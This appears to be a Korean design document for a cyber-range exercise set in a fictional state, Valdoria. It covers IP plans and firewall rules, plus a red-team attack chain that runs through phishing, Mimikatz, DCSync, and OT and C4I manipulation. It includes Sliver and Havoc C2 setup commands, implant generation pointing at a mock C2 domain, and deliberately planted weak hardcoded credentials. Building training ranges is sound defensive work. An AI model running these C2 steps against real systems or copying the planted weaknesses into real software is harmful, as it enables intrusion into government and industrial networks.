# 🌐 훈련 환경 IP 대역 설계

> 모든 자산 개발 및 설정 시 이 문서의 IP를 기준으로 사용한다.
> vSphere 폐쇄망 환경 기준 — 가상 국가 소속 기관 네트워크 구성
> 모든 기관명·도메인·국가 설정은 훈련용 픽션이며 실제 기관과 무관하다

---

# 설계 원칙

- **공공기관 DMZ**: 한국 공공기관 공인 IP처럼 보이는 `203.238.140.0/24` 사용
- **군 DMZ**: 국방 계열 공인 IP처럼 보이는 `211.57.64.0/24` 사용
- **내부망 (INT/OT/C4I)**: `192.168.x.0/24` 사용, 기관별 3번째 옥텟 구분
- **OPNSense 관리**: `192.168.1.0/24` 전용 (OOB 관리망)
- **VPN 풀**: `172.20.100.0/24`

---

# 존별 서브넷 할당

| 존 | 서브넷 | 게이트웨이 (OPNSense) | 비고 |
|---|---|---|---|
| 관리망 (OOB) | 192.168.1.0/24 | 192.168.1.1 | OPNSense 관리 인터페이스 전용 |
| 공공기관 DMZ | 203.238.140.0/24 | 203.238.140.1 | 공인 IP 대역 모사 |
| 공공기관 INT | 192.168.100.0/24 | 192.168.100.1 | 공공기관 내부업무망 |
| Industrial DMZ | 192.168.200.0/24 | 192.168.200.1 | 산업제어 중간망 |
| OT | 192.168.201.0/24 | 192.168.201.1 | 제어망 (완전 격리) |
| 군 DMZ (EXT) | 211.57.64.0/24 | 211.57.64.1 | 국방 공인 IP 대역 모사 |
| 군 INT | 192.168.110.0/24 | 192.168.110.1 | 군 내부 업무망 |
| 군 패치관리 전용 | 192.168.120.0/24 | 192.168.120.1 | VPN 경유만 허용 |
| C4I | 192.168.130.0/24 | 192.168.130.1 | 작전망 (완전 격리) |
| VPN 클라이언트 풀 | 172.20.100.0/24 | 172.20.100.1 | OpenVPN 할당 대역 |

---

# OPNSense 방화벽 인터페이스 구성

| 인스턴스 | WAN (업스트림) | LAN (다운스트림) | 역할 |
|---|---|---|---|
| OPNSense-1 | vSphere 외부 포트 | 203.238.140.1/24 | 외부 ↔ 공공기관 DMZ |
| OPNSense-2 | 203.238.140.254/24 | 192.168.100.1/24 | 공공기관 DMZ ↔ INT |
| OPNSense-3 | 192.168.100.253/24 | 211.57.64.1/24 | 공공기관 INT ↔ 군 DMZ (논리적 단절) |
| OPNSense-4 | 192.168.100.252/24 | 192.168.200.1/24 | 공공기관 INT ↔ Industrial DMZ |
| OPNSense-5 | 192.168.200.254/24 | 192.168.201.1/24 | Industrial DMZ ↔ OT |
| OPNSense-6 | 211.57.64.254/24 | 192.168.110.1/24, 192.168.120.1/24 | 군 DMZ ↔ INT + 패치관리 서브넷 |
| OPNSense-7 | 192.168.110.254/24 | 192.168.130.1/24 | 군 INT ↔ C4I |

> OPNSense 관리 인터페이스: 192.168.1.11 ~ 192.168.1.17 순서로 할당

---

# 자산별 고정 IP 전체 목록

## 🏢 공공기관 DMZ (203.238.140.0/24)

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| — | OPNSense-1 (LAN) | 203.238.140.1 | — | — |
| 1 | 외부 포털 서버 | 203.238.140.10 | 80, 443, 8000 | Ubuntu 22.04 |
| 2 | 메일 포털 게이트 | 203.238.140.11 | 80, 443 | Ubuntu 22.04 |
| 3 | 민원 접수 서버 | 203.238.140.12 | 80, 443, 8000, 9000 | Ubuntu 22.04 |

## 🏢 공공기관 INT (192.168.100.0/24)

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| — | OPNSense-2 (LAN) | 192.168.100.1 | — | — |
| 4 | 내부 업무 포털 | 192.168.100.10 | 80, 8080 | Ubuntu 22.04 |
| 5 | 웹메일 | 192.168.100.11 | 25, 143, 993, 80 | Debian 12 |
| 6 | 민원 처리 서버 | 192.168.100.12 | 6379(Redis) | Ubuntu 22.04 |
| 7 | AI Assistant | 192.168.100.13 | 3000, 11434 | Ubuntu 22.04 |
| 8 | DB 서버 | 192.168.100.20 | 5432 | Ubuntu 22.04 |
| 9 | 업무용 PC-1 | 192.168.100.31 | — | Windows 10/11 |
| 9 | 업무용 PC-2 | 192.168.100.32 | — | Windows 10/11 |
| 9 | 업무용 PC-3 | 192.168.100.33 | — | Windows 10/11 |
| 9 | 업무용 PC-4 | 192.168.100.34 | — | Windows 10/11 |
| 9 | 업무용 PC-5 | 192.168.100.35 | — | Windows 10/11 |
| 10 | 관리자 PC | 192.168.100.40 | — | Windows 10/11 |
| 11 | 인증 서버 (AD/DC) | 192.168.100.50 | 389, 636, 88, 445 | Windows Server 2022 |

## 🏭 Industrial DMZ (192.168.200.0/24)

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| — | OPNSense-4 (LAN) | 192.168.200.1 | — | — |
| 12 | Historian 서버 | 192.168.200.10 | 8086(InfluxDB), 8000(API) | Ubuntu 22.04 |

## ⚙️ OT (192.168.201.0/24)

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| — | OPNSense-5 (LAN) | 192.168.201.1 | — | — |
| 13 | SCADA 서버 | 192.168.201.10 | 8080(SCADA-LTS), 1880(Node-RED) | Rocky Linux 9 |
| 14 | PLC 시뮬레이터 | 192.168.201.11 | 5000 | Ubuntu 22.04 |
| 15 | 운영자 PC-1 | 192.168.201.21 | — | Windows 10/11 |
| 15 | 운영자 PC-2 | 192.168.201.22 | — | Windows 10/11 |

## 🪖 군 DMZ (211.57.64.0/24)

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| — | OPNSense-3/6 (LAN) | 211.57.64.1 | — | — |
| D1 | 외부 포털 서버 | 211.57.64.10 | 80, 443, 8080 | Rocky Linux 9 |
| D2 | VPN 게이트웨이 | 211.57.64.11 | 1194(UDP), 443 | Ubuntu 22.04 |
| D3 | 자료교환체계 (Nextcloud) | 211.57.64.12 | 80, 443 | Ubuntu 22.04 |
| D4 | 허니팟 SSH (Cowrie) | 211.57.64.13 | 22 | Ubuntu 22.04 |
| D5 | 허니팟 Web | 211.57.64.14 | 80, 443 | Ubuntu 22.04 |

## 🪖 군 INT (192.168.110.0/24)

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| — | OPNSense-6 (LAN) | 192.168.110.1 | — | — |
| I6 | 내부 업무 포털 | 192.168.110.10 | 80, 8080 | Rocky Linux 9 |
| I7 | 웹메일 서버 | 192.168.110.11 | 25, 143, 993, 80 | Debian 12 |
| I8 | 문서 저장 서버 | 192.168.110.12 | 80, 8000 | Ubuntu 22.04 |
| I10 | 업무용 PC-1 | 192.168.110.31 | — | Windows 10/11 |
| I10 | 업무용 PC-2 | 192.168.110.32 | — | Windows 10/11 |
| I10 | 업무용 PC-3 | 192.168.110.33 | — | Windows 10/11 |
| I10 | 업무용 PC-4 | 192.168.110.34 | — | Windows 10/11 |
| I10 | 업무용 PC-5 | 192.168.110.35 | — | Windows 10/11 |
| I11 | 관리자 PC | 192.168.110.40 | — | Windows 10/11 |

## 🪖 군 패치관리 전용 서브넷 (192.168.120.0/24)

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| — | OPNSense-6 (서브넷) | 192.168.120.1 | — | — |
| I9 | 패치 관리 서버 | 192.168.120.10 | 80, 8080 | Debian 12 |

> VPN 인증 성공 시 이 서브넷(192.168.120.0/24)만 라우팅 허용

## 🎯 C4I (192.168.130.0/24)

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| — | OPNSense-7 (LAN) | 192.168.130.1 | — | — |
| C12 | 망 연동 서버 | 192.168.130.10 | 22, 8000 | Ubuntu 22.04 |
| C13 | 작전 상황도 서버 | 192.168.130.11 | 8080 | Rocky Linux 9 |
| C14 | 데이터 수집·관리 서버 | 192.168.130.12 | 8000, 5432 | Ubuntu 22.04 |
| C15 | 상황 요약 AI 서버 | 192.168.130.13 | 8001, 11434 | Ubuntu 22.04 |
| C16 | 작전용 PC-1 | 192.168.130.21 | — | Windows 10/11 |
| C16 | 작전용 PC-2 | 192.168.130.22 | — | Windows 10/11 |
| C16 | 작전용 PC-3 | 192.168.130.23 | — | Windows 10/11 |
| C16 | 작전용 PC-4 | 192.168.130.24 | — | Windows 10/11 |
| C16 | 작전용 PC-5 | 192.168.130.25 | — | Windows 10/11 |

## 🔐 VPN 클라이언트 풀 (172.20.100.0/24)

| 항목 | 값 |
|---|---|
| VPN 서버 | 211.57.64.11 |
| 클라이언트 할당 범위 | 172.20.100.100 ~ 172.20.100.200 |
| 인증 후 접근 허용 | 192.168.120.0/24 (패치관리서버 전용 서브넷) 만 |

---

# 주요 방화벽 허용 규칙 요약

| OPNSense | 허용 방향 | 차단 방향 |
|---|---|---|
| OPNSense-1 | 외부 → DMZ (80, 443) | DMZ → 외부 직접 차단 |
| OPNSense-2 | 203.238.140.x → 192.168.100.x 특정 포트 | INT → DMZ 역방향 |
| OPNSense-3 | 없음 (논리적 단절, 크리덴셜 탈취로만 우회) | 전방향 차단 |
| OPNSense-4 | 192.168.100.12 → 192.168.200.10:8000 | Industrial DMZ → INT 역방향 차단 |
| OPNSense-5 | 192.168.200.x → 192.168.201.10 | OT → Industrial DMZ 역방향 차단 |
| OPNSense-6 | VPN 인증 성공 → 192.168.120.0/24 만 | VPN → 192.168.110.x 직접 차단 |
| OPNSense-7 | 192.168.110.x 특정 서버 → 192.168.130.x | 전방향 기본 차단 |

---

---

# 가상 국가 및 기관 설정

## 훈련 세계관

| 항목 | 설정값 | 비고 |
|---|---|---|
| 가상 국가명 | **Valdoria** | 픽션 국가 |
| 공격 그룹 | IRON VEIL + GORGON | 가상 APT + RaaS |
| 공격 그룹 배후 | 불명 (훈련 중 추적 과제) | — |
| 훈련 사용 언어 | 한국어 / 영어 | 시스템 UI·로그 포함 |

## 가상 도메인 설계

### 공공기관 영역

| 자산 | 도메인 / FQDN | 비고 |
|---|---|---|
| 외부 포털 서버 | `www.mois.valdoria.gov` | 행정안전부 모사 |
| 메일 포털 게이트 | `webmail.mois.valdoria.gov` | 외부 웹메일 접근 |
| 민원 접수 서버 | `minwon.mois.valdoria.gov` | 민원 포털 |
| 내부 업무 포털 | `intranet.mois.local` | 내부망 전용 |
| 웹메일 (내부) | `mail.mois.local` | Roundcube |
| DB 서버 | `db.mois.local` | — |
| AI Assistant | `ai.mois.local` | OpenWebUI |
| AD 도메인 | `corp.mois.local` | Active Directory |

### 군 영역

| 자산 | 도메인 / FQDN | 비고 |
|---|---|---|
| 외부 포털 서버 | `www.mnd.valdoria.mil` | 국방부 모사 |
| VPN 게이트웨이 | `vpn.mnd.valdoria.mil` | 원격접속 |
| 자료교환체계 | `share.mnd.valdoria.mil` | Nextcloud |
| 내부 업무 포털 | `intranet.mnd.local` | 군 내부망 |
| 웹메일 서버 | `mail.mnd.local` | Roundcube |
| 문서 저장 서버 | `docs.mnd.local` | — |
| 패치 관리 서버 | `update.mnd.local` | 전용 서브넷 |
| 군 AD 도메인 | `corp.mnd.local` | Active Directory |

### C4I 영역

| 자산 | 도메인 / FQDN | 비고 |
|---|---|---|
| 작전 상황도 서버 | `cop.c4i.local` | COP 웹 |
| 데이터 수집 서버 | `data.c4i.local` | FastAPI |
| 상황 요약 AI | `summary.c4i.local` | LLaMA 파이프라인 |
| 망 연동 서버 | `relay.c4i.local` | INT↔C4I 연계 |

> **내부 DNS 설계**: `.mois.local`, `.mnd.local`, `.c4i.local` 은 각 AD/내부 DNS 서버가 리졸브
> **외부 DNS 모사**: `*.valdoria.gov`, `*.valdoria.mil` 은 훈련망 내부 DNS 서버(192.168.1.20)가 직접 리졸브

---

# C2 프레임워크 구성

## 구성 개요

```
[레드팀 운영 서버 — 훈련망 외부 또는 별도 관리 VM]

  Sliver Server  ←──────────── 메인 C2 (전 구간)
  Havoc Server   ←──────────── 보조 C2 (Windows 단말 특화)
```

## 역할 분담

| C2 | 담당 구간 | 에이전트 | 통신 채널 |
|---|---|---|---|
| **Sliver** | Linux 서버 전반, 초기 거점 확보, 횡이동 | Sliver implant (Go) | HTTPS, mTLS, DNS |
| **Havoc** | Windows 업무용·관리자 PC, AD 공격 | Demon (C) | HTTPS |

## 공격 단계별 C2 사용

| 공격 단계 | C2 | 설명 |
|---|---|---|
| PHASE 1 — DMZ 초기 침투 | Sliver | 민원처리서버 역셸 → Sliver implant 이식 |
| PHASE 2 — INT 서버 확산 | Sliver | 업무포털·DB·AI 서버 장악 |
| PHASE 2 — PC 감염·AD 공격 | Havoc | 피싱 메일 → Demon 실행 → Mimikatz → DCSync |
| PHASE 3 — OT 침투 | Sliver | Historian·SCADA 접근 (Linux 기반) |
| PHASE 4 — 군 침투 | Sliver | VPN 진입 후 군 INT 서버 장악 |
| PHASE 4 — 군 PC 감염 | Havoc | 패치 악성파일 → Demon 실행 |
| PHASE 5 — C4I 조작 | Sliver | 데이터수집서버·상황도서버 API 조작 |

## Sliver 설치 및 운영 참고

```bash
# 서버 설치 (Ubuntu 22.04)
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux && ./sliver-server_linux

# HTTPS 리스너 (가상 도메인 활용)
sliver> https --domain update.valdoria.news --lport 443

# implant 생성 (Linux 서버용)
sliver> generate --http update.valdoria.news --os linux --arch amd64 --format elf --save /tmp/

# implant 생성 (Windows PC용 — Havoc Demon과 구분)
sliver> generate --http update.valdoria.news --os windows --arch amd64 --format exe --save /tmp/
```

## Havoc 설치 및 운영 참고

```bash
# 서버 빌드 (Ubuntu 22.04 기준)
git clone https://github.com/HavocFramework/Havoc && cd Havoc
make ts-build

# teamserver 설정 (Profiles/havoc.yaotl)
# Listener: HTTPS 443, 가상 도메인 설정
# → Host: update.valdoria.news

# Demon 생성 (GUI에서)
# Config → Indirect Syscall ON, Sleep Obfuscation ON
# → Windows x64 exe 생성
```

## C2 리다이렉터 (선택)

훈련망 내부이므로 리다이렉터는 선택사항이지만, 현실감을 위해 구성할 경우:

```
공격자 → 리다이렉터 VM (Nginx, 203.238.140.200) → Sliver/Havoc Server
```

C2 도메인 예시 (훈련망 내부 DNS에 등록):
- `update.valdoria.news` → 리다이렉터 IP (Sliver)
- `cdn.valdoria.info` → 리다이렉터 IP (Havoc)

---

# 개발 시 사용할 환경변수 템플릿

AI에게 코드를 맡길 때 아래 값을 그대로 주입하도록 지시한다.

```env
# ── 공공기관 공통 ──────────────────────────────────────────
DOMAIN=mois.valdoria.gov
DOMAIN_INTERNAL=mois.local
MIL_DOMAIN_EXT=mnd.valdoria.mil
MIL_DOMAIN_INT=mnd.local
AD_SERVER=192.168.100.50
AD_DOMAIN=corp.mois.local

# ── 민원 접수 서버 (203.238.140.12) ───────────────────────
COMPLAINT_API_URL=http://203.238.140.12:8000
MINIO_ENDPOINT=203.238.140.12:9000
MINIO_ACCESS_KEY=minio_access
MINIO_SECRET_KEY=minio_secret123

# ── 민원 처리 서버 (192.168.100.12) ───────────────────────
REDIS_URL=redis://192.168.100.12:6379
COMPLAINT_INTAKE_HOST=203.238.140.12

# ── DB 서버 (192.168.100.20) ───────────────────────────────
# [취약 설정] application.properties에 하드코딩
DB_HOST=192.168.100.20
DB_PORT=5432
DB_NAME=agency_db
DB_USER=app_service
DB_PASSWORD=Sup3rS3cr3t!          # SUPERUSER 권한 부여됨

# ── 내부 업무 포털 (192.168.100.10) ───────────────────────
PORTAL_URL=http://192.168.100.10:8080

# ── 웹메일 (192.168.100.11) ────────────────────────────────
MAIL_HOST=192.168.100.11
SMTP_PORT=25
IMAP_PORT=143

# ── AI Assistant (192.168.100.13) ─────────────────────────
OPENWEBUI_URL=http://192.168.100.13:3000
OLLAMA_URL=http://192.168.100.13:11434

# ── Historian (192.168.200.10) ─────────────────────────────
HISTORIAN_API=http://192.168.200.10:8000
INFLUXDB_URL=http://192.168.200.10:8086
INFLUXDB_TOKEN=historian-dev-token-2024
INFLUXDB_ORG=ot-org
INFLUXDB_BUCKET=ot_data

# ── SCADA (192.168.201.10) ─────────────────────────────────
SCADA_URL=http://192.168.201.10:8080
NODERED_URL=http://192.168.201.10:1880

# ── PLC 시뮬레이터 (192.168.201.11) ───────────────────────
PLC_API=http://192.168.201.11:5000

# ── 군 공통 ────────────────────────────────────────────────
MIL_AD_DOMAIN=corp.mnd.local
VPN_HOST=211.57.64.11

# ── 군 자료교환체계 (211.57.64.12) ────────────────────────
NEXTCLOUD_URL=http://211.57.64.12
NEXTCLOUD_USER=GOV20190847
NEXTCLOUD_PASS=20190847890312      # [취약 설정] 초기 비밀번호 미변경

# ── 군 문서 저장 서버 (192.168.110.12) ────────────────────
DOCSTORAGE_URL=http://192.168.110.12:8000

# ── 패치 관리 서버 (192.168.120.10) ───────────────────────
PATCH_SERVER_URL=http://192.168.120.10

# ── C4I 데이터 수집 (192.168.130.12) ──────────────────────
# [취약 설정] 하드코딩된 API 키
C4I_API_URL=http://192.168.130.12:8000
C4I_API_KEY=dev-key-12345

# ── 작전 상황도 (192.168.130.11) ──────────────────────────
COP_URL=http://192.168.130.11:8080

# ── 상황 요약 AI (192.168.130.13) ─────────────────────────
SUMMARY_AI_URL=http://192.168.130.13:8001
SUMMARY_OLLAMA_URL=http://192.168.130.13:11434
```

---

# vSphere Port Group 구성

| Port Group 이름 | 서브넷 | VLAN ID |
|---|---|---|
| PG-MGMT | 192.168.1.0/24 | 1 |
| PG-PUB-DMZ | 203.238.140.0/24 | 10 |
| PG-PUB-INT | 192.168.100.0/24 | 20 |
| PG-IND-DMZ | 192.168.200.0/24 | 30 |
| PG-OT | 192.168.201.0/24 | 40 |
| PG-MIL-DMZ | 211.57.64.0/24 | 110 |
| PG-MIL-INT | 192.168.110.0/24 | 120 |
| PG-MIL-PATCH | 192.168.120.0/24 | 130 |
| PG-C4I | 192.168.130.0/24 | 140 |
